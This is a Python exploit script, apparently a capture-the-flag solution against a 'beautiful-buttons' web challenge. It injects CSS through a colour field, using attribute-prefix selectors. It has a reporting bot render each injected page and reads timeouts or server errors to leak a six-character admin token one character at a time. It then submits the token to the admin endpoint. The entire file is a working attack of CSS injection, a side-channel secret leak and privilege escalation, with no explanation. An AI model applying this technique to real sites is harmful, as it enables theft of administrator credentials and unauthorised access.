import requests

url = "https://beautiful-buttons.1nf1n1ty.team"
characters = "1234567890abcdef"
admintoken = ""
auth_key = "d7efb648-9ff0-4c4c-a4fd-d656f1f08d16"
notworking = False
ttl_start = requests.get(url + "/pow?ttl=" + auth_key)
token_size = 6
total = 0
for j in range(token_size - len(admintoken)):
    ttl = requests.get(url + "/pow?ttl=" + auth_key)
    print(f"{ttl.text}")
    if notworking:
        break
    for i in characters:
        total+=1
        payload = (
            """#000000;display: block;float: left;width: 822px;height: 998px;} :host-context(.container[secret^='"""
            + admintoken
            + i
            + """']) .btn_container{column-width: 598px !important; column-gap: 40px;}.buttonstuff{ text-indent: 1.5em;display: block !important;margin: 0;padding: 0;border-bottom: 0;}p{color: #000","size": "small"""
        )

        data = {
            "text": "</button><br><!--",
            "bgcolor": payload,
            "borderRadius": "5",
        }

        response = requests.post(url + "/generate", data=data, allow_redirects=False)
        post_url = response.headers["Location"]
        post_url = post_url.replace("/show/", "")
        print(f"{(admintoken+i).ljust(token_size, '_')}")
        postdata = {"post_id": post_url, "auth_key": auth_key}
        try:
            response = requests.post(url + "/report", data=postdata, timeout=4)
            if response.status_code == 500:
                admintoken += i
                break
            elif response.status_code != 200:
                print(f"{response.status_code} {response.text}")
        except requests.exceptions.Timeout:
            admintoken += i
            break

    else:
        print(f"Only found {admintoken}")
        notworking = True
print(total)
if len(admintoken) == token_size:
    print(f"{ttl_start.text}")
    ttl_end = requests.get(url + "/pow?ttl=" + auth_key)
    print(f"{ttl_end.text}")

    response = requests.post(
        url + "/admin",
        data={"UserAdminToken": admintoken, "auth_key": auth_key},
        allow_redirects=False,
    )
    print(response.text)
